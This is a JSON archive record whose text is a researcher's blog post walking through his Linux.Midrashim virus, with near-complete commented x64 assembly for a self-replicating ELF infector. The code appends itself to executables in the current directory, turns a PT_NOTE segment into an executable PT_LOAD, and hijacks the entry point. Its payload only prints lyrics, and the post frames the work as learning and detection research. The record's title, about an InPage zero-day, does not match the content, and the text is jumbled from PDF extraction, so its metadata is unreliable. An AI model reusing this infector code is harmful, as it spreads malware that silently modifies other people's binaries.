{
    "id": "125ce901-a520-4cbd-82a3-1903998a95f0",
    "created_at": "2023-01-12T15:01:04.870425Z",
    "updated_at": "2025-03-27T02:05:26.987636Z",
    "deleted_at": null,
    "sha1_hash": "a1a1c48563ba148ec8c8f2c4ea6a81ef8b743af6",
    "title": "2016-11-23 - InPage zero-day exploit used to attack financial institutions in Asia",
    "authors": "",
    "file_creation_date": "2022-05-01T14:11:58Z",
    "file_modification_date": "2022-05-01T14:11:58Z",
    "file_size": 282318,
    "plain_text": "# Linux.Midrashim: Assembly x64 ELF virus\n\n**guitmz.com/linux-midrashim-elf-virus**\n\nGuilherme Thomazi January 18, 2021\n\n#### 15 minute read  Published: 18 Jan, 2021\n\n PT_NOTE -> PT_LOAD x64 ELF virus written in Assembly\n\n## Overview\n\n#### My interest in Assembly language started when I was a kid, mainly because of computer viruses of the DOS era. I’ve spent countless hours contemplating my first humble collection of source codes and samples (you can find it at https://github.com/guitmz/virii) and to me, it’s cool how flexible and creative one can get with Assembly, even if its learning curve is steep.\n\n I’m an independant malware researcher and wrote this virus to learn and have fun, expanding my knowledge on the several ELF attack/defense techniques and Assembly in general.\n\n The code does not implement any evasion techniques and detection is trivial. Samples were also shared with a few major Antivirus companies prior to the release of this code and signatures were created, such as Linux/Midrashim.A by ESET. I’m also working on a vaccine which will be available at a later date. I’ll update this post when it’s ready.\n\n The payload is not destructive, as usual. It just prints the harmless lyrics of Ozar Midrashim song to stdout and the layout of an infected file is the following (full image):\n\n\n-----\n\n## How it works\n```\nMidrashim is a 64 bits Linux infector that targets ELF files in the current directory (non\n\n#### recursively). It relies on the well known PT_NOTE -> PT_LOAD infection technique and should work on regular and position independent binaries. This method has a high success rate and it’s easy to implement (and detect). Read more about it here.\n\n It will not work on Golang executables, because those need the PT_NOTE segment to run properly (infection works, but infected file will segfault after virus execution).\n\n```\n\n-----\n\n#### For simplicity s sake, it makes use of pread64 and pwrite64 to read/write specific locations in the target file when it should use mmap instead, for flexibility and reliability. A few other things could be improved too, like detecting first virus execution with a better approach and more error handling to minimize pitfalls.\n\n I had so many ideas for the payload of Midrashim, from inspiration I got from projects at http://www.pouet.net/ to controlling the terminal with ANSI escape codes (more on that here - which is something I wrote with Midrashim in mind).\n\n Due to lack of free time and given the complexity of implementing such things in Assembly, specially in a code of this nature, I ended up with something simpler and will probably revisit this subject on a future project.\n\n## Code\n\n#### This is my first full assembly infector and should be assembled with FASM x64. Its core functionality consists of:\n\n Reserving space on stack to store values in memory Checking if its virus first run (displays a different payload message if running for the first time) Open current directory for reading Loop through files in the directory, checking for targets for infection Try to infect target file Continue looping the directory until no more infection targets are available, then exit\n\n Full code with comments is available at https://github.com/guitmz/midrashim and we’ll now go over each step above with a bit more detail.\n\n If you need help understanding Linux system calls parameters, feel free to visit my new (work in progress) website: https://syscall.sh\n\n### The secret of getting ahead is getting started\n\n#### For the stack buffer, I used r15 register and added the comments below for reference when browsing the code.\n\n Note the values, for example, the ELF header, which is 64 bytes long. Since r15 + 144 represents its start, it should end at r15 + 207 . The values in between are also accounted for, like ehdr.entry that starts at r15 + 168, which is 8 bytes long, ends at r15 + 175 .\n\n\n-----\n\n```\n; r15 + 0 stack buffer stat\n; r15 + 48 = stat.st_size\n; r15 + 144 = ehdr\n; r15 + 148 = ehdr.class\n; r15 + 152 = ehdr.pad\n; r15 + 168 = ehdr.entry\n; r15 + 176 = ehdr.phoff\n; r15 + 198 = ehdr.phentsize\n; r15 + 200 = ehdr.phnum\n; r15 + 208 = phdr = phdr.type\n; r15 + 212 = phdr.flags\n; r15 + 216 = phdr.offset\n; r15 + 224 = phdr.vaddr\n; r15 + 232 = phdr.paddr\n; r15 + 240 = phdr.filesz\n; r15 + 248 = phdr.memsz\n; r15 + 256 = phdr.align\n; r15 + 300 = jmp rel\n; r15 + 350 = directory size\n; r15 + 400 = dirent = dirent.d_ino\n; r15 + 416 = dirent.d_reclen\n; r15 + 418 = dirent.d_type\n; r15 + 419 = dirent.d_name\n; r15 + 3000 = first run control flag\n; r15 + 3001 = decoded payload\n\n#### Reserving stack space is easy, there are different ways of doing it, one is to subtract from\nrsp, then just store it in r15 . Also right on start, we store argv0 to r14 (it’s going to be\n\n needed next) and we push rdx and rsp, which need to be restored before the end of virus execution, so the infected file can run properly.\nv_start:\n  mov r14, [rsp + 8] ; saving argv0 to r14\n  push rdx\n  push rsp\n  sub rsp, 5000    ; reserving 5000 bytes\n  mov r15, rsp    ; r15 has the reserved stack buffer address\n\n To check for the virus first execution, we get argv0 size in bytes and compare to the final virus size, which was stored in V_SIZE . If greater, it’s not the first run and we set a control value into a place in the stack buffer for later use. This was a last minute addition that it’s not great (but pretty easy to implement and rather obvious).\n\n```\n\n-----\n\n```\ncheck_first_run:\n  mov rdi, r14            ; argv0 to rdi\n  mov rsi, O_RDONLY\n  xor rdx, rdx            ; not using any flags\n  mov rax, SYS_OPEN\n  syscall               ; rax contains the argv0 fd\n  mov rdi, rax\n  mov rsi, r15            ; rsi = r15 = stack buffer address\n  mov rax, SYS_FSTAT         ; getting argv0 size in bytes\n  syscall               ; stat.st_size = [r15 + 48]\n  cmp qword [r15 + 48], V_SIZE    ; compare argv0 size with virus size\n  jg load_dir             ; if greater, not first run, continue\ninfecting without setting control flag\n  mov byte [r15 + 3000], FIRST_RUN  ; set the control flag to [r15 + 3000] to\nrepresent virus first execution\n\n### The Wild Hunt\n\n#### We need to find targets to infect. For that we’ll open the current directory for reading using getdents64 syscall, which will return the number of entries in it. That goes into the stack buffer.\nload_dir:\n  push \".\"            ; pushing \".\" to stack (rsp)\n  mov rdi, rsp          ; moving \".\" to rdi\n  mov rsi, O_RDONLY\n  xor rdx, rdx          ; not using any flags\n  mov rax, SYS_OPEN\n  syscall            ; rax contains the fd\n  pop rdi\n  cmp rax, 0           ; if can't open file, exit now\n  jbe v_stop\n  mov rdi, rax          ; move fd to rdi\n  lea rsi, [r15 + 400]      ; rsi = dirent = [r15 + 400]\n  mov rdx, DIRENT_BUFSIZE    ; buffer with maximum directory size\n  mov rax, SYS_GETDENTS64\n  syscall            ; dirent contains the directory entries\n  test rax, rax         ; check directory list was successful\n  js v_stop           ; if negative code is returned, I failed and\nshould exit\n  mov qword [r15 + 350], rax   ; [r15 + 350] now holds directory size\n  mov rax, SYS_CLOSE       ; close source fd in rdi\n  syscall\n  xor rcx, rcx          ; will be the position in the directory entries\n\n```\n\n-----\n\n#### Now the hunt gets a little more… wild, as we loop through each file from directory listing we just performed. Steps performed:\n\n Open target file Validate that it’s an ELF and 64 bits (by verifying its magic number and class information from its header) Check if already infected (by looking for the infection mark that should be set in\n```\n   ehdr.pad ) and\n\n if yes, move to next file, until all files in the directory are checked If not, loop through the target Program Headers, looking for a PT_NOTE section, starting the infection process upon finding it\n\n```\n\n-----\n\n```\nfile_loop:\n  push rcx                  ; preserving rcx\n  cmp byte [rcx + r15 + 418], DT_REG     ; check if it's a regular file\ndirent.d_type = [r15 + 418]\n  jne .continue               ; if not, proceed to next file\n  .open_target_file:\n    lea rdi, [rcx + r15 + 419]       ; dirent.d_name = [r15 + 419]\n    mov rsi, O_RDWR\n    xor rdx, rdx              ; not using any flags\n    mov rax, SYS_OPEN\n    syscall\n    cmp rax, 0               ; if can't open file, exit now\n    jbe .continue\n    mov r9, rax              ; r9 contains target fd\n  .read_ehdr:\n    mov rdi, r9              ; r9 contains fd\n    lea rsi, [r15 + 144]          ; rsi = ehdr = [r15 + 144]\n    mov rdx, EHDR_SIZE           ; ehdr.size\n    mov r10, 0               ; read at offset 0\n    mov rax, SYS_PREAD64\n    syscall\n  .is_elf:\n    cmp dword [r15 + 144], 0x464c457f   ; 0x464c457f means .ELF (littleendian)\n    jnz .close_file            ; not an ELF binary, close and\ncontinue to next file if any\n  .is_64:\n    cmp byte [r15 + 148], ELFCLASS64    ; check if target ELF is 64bit\n    jne .close_file            ; skipt it if not\n  .is_infected:\n    cmp dword [r15 + 152], 0x005a4d54   ; check signature in [r15 + 152]\nehdr.pad (TMZ in little-endian, plus trailing zero to fill up a word size)\n    jz .close_file             ; already infected, close and continue\nto next file if any\n    mov r8, [r15 + 176]          ; r8 now holds ehdr.phoff from [r15 +\n176]\n    xor rbx, rbx              ; initializing phdr loop counter in\nrbx\n    xor r14, r14              ; r14 will hold phdr file offset\n  .loop_phdr:\n    mov rdi, r9              ; r9 contains fd\n    lea rsi, [r15 + 208]          ; rsi = phdr = [r15 + 208]\n    mov dx, word [r15 + 198]        ; ehdr.phentsize is at [r15 + 198]\n    mov r10, r8              ; read at ehdr.phoff from r8\n(incrementing ehdr.phentsize each loop iteraction)\n    mov rax, SYS_PREAD64\n    syscall\n\n```\n\n-----\n\n```\n    cmp byte [r15 + 208], PT_NOTE     ; check if phdr.type in [r15 + 208] is\nPT_NOTE (4)\n    jz .infect               ; if yes, start infecting\n    inc rbx                ; if not, increase rbx counter\n    cmp bx, word [r15 + 200]        ; check if we looped through all phdrs\nalready (ehdr.phnum = [r15 + 200])\n    jge .close_file            ; exit if no valid phdr for infection\nwas found\n    add r8w, word [r15 + 198]       ; otherwise, add current\nehdr.phentsize from [r15 + 198] into r8w\n    jnz .loop_phdr             ; read next phdr\n\n### Reproductive System 101\n\n#### Did I already mention it was going to get wild? Just kidding, it’s not really that complicated, just long. It goes like this:\n\n Append the virus code ( v_stop - v_start ) to the target end of file. These offsets will change during different virus executions, so I’m using an old technique that calculates the delta memory offset using the call instruction and the value of rbp during runtime\n\n```\n\n-----\n\n```\n.infect:\n  .get_target_phdr_file_offset:\n    mov ax, bx                   ; loading phdr loop counter\nbx to ax\n    mov dx, word [r15 + 198]            ; loading ehdr.phentsize from\n[r15 + 198] to dx\n    imul dx                     ; bx * ehdr.phentsize\n    mov r14w, ax\n    add r14, [r15 + 176]              ; r14 = ehdr.phoff + (bx *\nehdr.phentsize)\n  .file_info:\n    mov rdi, r9\n    mov rsi, r15                  ; rsi = r15 = stack buffer\naddress\n    mov rax, SYS_FSTAT\n    syscall                     ; stat.st_size = [r15 + 48]\n  .append_virus:\n    ; getting target EOF\n    mov rdi, r9                   ; r9 contains fd\n    mov rsi, 0                   ; seek offset 0\n    mov rdx, SEEK_END\n    mov rax, SYS_LSEEK\n    syscall                     ; getting target EOF offset\nin rax\n    push rax                    ; saving target EOF\n    call .delta                   ; the age old trick\n    .delta:\n      pop rbp\n      sub rbp, .delta\n    ; writing virus body to EOF\n    mov rdi, r9                   ; r9 contains fd\n    lea rsi, [rbp + v_start]            ; loading v_start address in\nrsi\n    mov rdx, v_stop - v_start            ; virus size\n    mov r10, rax                  ; rax contains target EOF\noffset from previous syscall\n    mov rax, SYS_PWRITE64\n    syscall\n    cmp rax, 0\n    jbe .close_file\n\n#### Patching the target PT_NOTE segment\n Adjust its type, making it a PT_LOAD Change its flags (making it executable) Update its phdr.vaddr to point to the virus start ( 0xc000000 +\n      stat.st_size )\n\n Account for virus size on phdr.filesz and phdr.memsz Keep proper alignment\n\n```\n\n-----\n\n```\n.patch_phdr:\n  mov dword [r15 + 208], PT_LOAD         ; change phdr type in [r15 + 208]\nfrom PT_NOTE to PT_LOAD (1)\n  mov dword [r15 + 212], PF_R or PF_X       ; change phdr.flags in [r15 +\n212] to PF_X (1) | PF_R (4)\n  pop rax                     ; restoring target EOF offeset\ninto rax\n  mov [r15 + 216], rax              ; phdr.offset [r15 + 216] =\ntarget EOF offset\n  mov r13, [r15 + 48]               ; storing target stat.st_size\nfrom [r15 + 48] in r13\n  add r13, 0xc000000               ; adding 0xc000000 to target file\nsize\n  mov [r15 + 224], r13              ; changing phdr.vaddr in [r15 +\n224] to new one in r13 (stat.st_size + 0xc000000)\n  mov qword [r15 + 256], 0x200000         ; set phdr.align in [r15 + 256]\nto 2mb\n  add qword [r15 + 240], v_stop - v_start + 5   ; add virus size to phdr.filesz\nin [r15 + 240] + 5 for the jmp to original ehdr.entry\n  add qword [r15 + 248], v_stop - v_start + 5   ; add virus size to phdr.memsz in\n[r15 + 248] + 5 for the jmp to original ehdr.entry\n  ; writing patched phdr\n  mov rdi, r9                   ; r9 contains fd\n  mov rsi, r15                  ; rsi = r15 = stack buffer\naddress\n  lea rsi, [r15 + 208]              ; rsi = phdr = [r15 + 208]\n  mov dx, word [r15 + 198]            ; ehdr.phentsize from [r15 + 198]\n  mov r10, r14                  ; phdr from [r15 + 208]\n  mov rax, SYS_PWRITE64\n  syscall\n  cmp rax, 0\n  jbe .close_file\n\n#### Patching the ELF header\n Save original entrypoint for later in r14 Update entrypoint to be the same as the patched segment virtual address ( phdr.vaddr ) Add infection marker string to ehdr.pad\n\n```\n\n-----\n\n```\n.patch_ehdr:\n  ; patching ehdr\n  mov r14, [r15 + 168]              ; storing target original\nehdr.entry from [r15 + 168] in r14\n  mov [r15 + 168], r13              ; set ehdr.entry in [r15 + 168]\nto r13 (phdr.vaddr)\n  mov r13, 0x005a4d54               ; loading virus signature into\nr13 (TMZ in little-endian)\n  mov [r15 + 152], r13              ; adding the virus signature to\nehdr.pad in [r15 + 152]\n  ; writing patched ehdr\n  mov rdi, r9                   ; r9 contains fd\n  lea rsi, [r15 + 144]              ; rsi = ehdr = [r15 + 144]\n  mov rdx, EHDR_SIZE               ; ehdr.size\n  mov r10, 0                   ; ehdr.offset\n  mov rax, SYS_PWRITE64\n  syscall\n  cmp rax, 0\n  jbe .close_file\n\n### Those who don’t jump will never fly\n\n#### Deep, right? That’s exacly what we got to do, jump back to the original target entrypoint to continue the host execution.\n\n We’ll use a relative jump, which is represented by the e9 opcode with a with a 32 bit offset, making the whole instruction 5 bytes long ( e9 00 00 00 00 ).\n\n To create this instruction, we use the following formula, considering the patched\nphdr.vaddr from before:\n\n newEntryPoint = originalEntryPoint - (phdr.vaddr + 5) - virus_size\n\n There’s no secret here, we need to write this instruction to the very end of the file, after the recenty added virus body.\n\n```\n\n-----\n\n```\n.write_patched_jmp:\n  ; getting target new EOF\n  mov rdi, r9                   ; r9 contains fd\n  mov rsi, 0                   ; seek offset 0\n  mov rdx, SEEK_END\n  mov rax, SYS_LSEEK\n  syscall                     ; getting target EOF offset in\nrax\n  ; creating patched jmp\n  mov rdx, [r15 + 224]              ; rdx = phdr.vaddr\n  add rdx, 5\n  sub r14, rdx\n  sub r14, v_stop - v_start\n  mov byte [r15 + 300 ], 0xe9\n  mov dword [r15 + 301], r14d\n  ; writing patched jmp to EOF\n  mov rdi, r9                   ; r9 contains fd\n  lea rsi, [r15 + 300]              ; rsi = patched jmp in stack\nbuffer = [r15 + 208]\n  mov rdx, 5                   ; size of jmp rel\n  mov r10, rax                  ; mov rax to r10 = new target EOF\n  mov rax, SYS_PWRITE64\n  syscall\n  cmp rax, 0\n  jbe .close_file\n  mov rax, SYS_SYNC                ; commiting filesystem caches to\ndisk\n  syscall\n\n### Payload’s on the way\n\n#### We’re almost done here, phew! The final bits of code will take care of displaying the text payload to the screen.\n\n We check if it’s the virus first run (which means it’s not running from inside an infected file) and in case this is true, we print a message to the screen and exit If not the first run, we print a different message to the screen, which is encoded using\n   xor and add instructions. The purpose of this was to prevent the string from\n\n showing up in the binary as plain text\n\n```\n\n-----\n\n```\ncmp byte [r15 + 3000], FIRST_RUN             ; checking if custom\ncontrol flag we set earlier indicates virus first execution\njnz infected_run                     ; if control flag != 1, it\nshould be running from an infected file, use normal payload\n call show_msg                      ; if control flag == 1,\nassume virus is being executed for the first time and display a different message\n info_msg:\n   db 'Midrashim by TMZ (c) 2020', 0xa         ; not the nicest approach\nlike I mentioned before but quick to implement\n   info_len = $-info_msg\n show_msg:      \n   pop rsi                       ; info_msg address to rsi\n   mov rax, SYS_WRITE\n   mov rdi, STDOUT                   ; display payload\n   mov rdx, info_len\n   syscall\n   jmp cleanup                     ; cleanup and exit\ninfected_run:\n ; 1337 encoded payload, very hax0r\n call payload\n msg:\n   ; payload first part\n   db 0x59, 0x7c, 0x95, 0x95, 0x57, 0x9e, 0x9d, 0x57\n   db 0xa3, 0x9f, 0x92, 0x57, 0x93, 0x9e, 0xa8, 0xa3\n   db 0x96, 0x9d, 0x98, 0x92, 0x57, 0x7e, 0x57, 0x98\n   db 0x96, 0x9d, 0x57, 0xa8, 0x92, 0x92, 0x57, 0x96\n   ...\n   len = $-msg\n payload:\n   pop rsi                       ; setting up decoding loop\n   mov rcx, len\n   lea rdi, [r15 + 3001]\n   .decode:\n     lodsb                      ; load byte from rsi into\nal\n     sub al, 50                   ; decoding it\n     xor al, 5\n     stosb                      ; store byte from al into\nrdi\n     loop .decode                  ; sub 1 from rcx and\ncontinue loop until rcx = 0\n   lea rsi, [r15 + 3001]                ; decoded payload is at\n[r15 + 3000]\n   mov rax, SYS_WRITE\n   mov rdi, STDOUT                   ; display payload\n   mov rdx, len\n   syscall\n\n## Demo\n\n```\n\n-----\n\n```\n int main() {\n   printf(\"I am the target!\\n\");\n   return 0;\n }\n [guitmz@vps midrashim]$ gcc target.c -o target\n [guitmz@vps midrashim]$ gcc -pie -fPIC target.c -o target2\n [guitmz@vps midrashim]$ file target\n target: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f20036dd702fa2723c4315bcf90c5af94b138aa8, not stripped\n [guitmz@vps midrashim]$ file target2\n\n## Outro\n\n#### This ended up being one of my longest projects. I remember coming back to it multiple times during a period of months, sometimes because I was stuck and had to do research and, other times, the Assembly logic fell into oblivion and took me a moment to get back on track with my thoughts.\n\n Many consider Assembly and ELF injection an art form (myself included) and over the decades, new techniques were developed and improved. It’s essential to talk about these and share the knowledge in order to improve the detection of threat actors, which are starting to realize more and more that Linux seems to not be yet a priority of security companies.\n\n In the end, it was one of the most fun and rewarding codes I ever wrote, albeit not really being one of the best.\n\n TMZ\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Infection/ELF Infection in Assembly x64 - Midrashim virus.pdf"
    ],
    "report_names": [
        "ELF Infection in Assembly x64 - Midrashim virus.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535664,
    "ts_updated_at": 1743041126,
    "ts_creation_date": 1651414318,
    "ts_modification_date": 1651414318,
    "files": {
        "pdf": "https://archive.orkl.eu/a1a1c48563ba148ec8c8f2c4ea6a81ef8b743af6.pdf",
        "text": "https://archive.orkl.eu/a1a1c48563ba148ec8c8f2c4ea6a81ef8b743af6.txt",
        "img": "https://archive.orkl.eu/a1a1c48563ba148ec8c8f2c4ea6a81ef8b743af6.jpg"
    }
}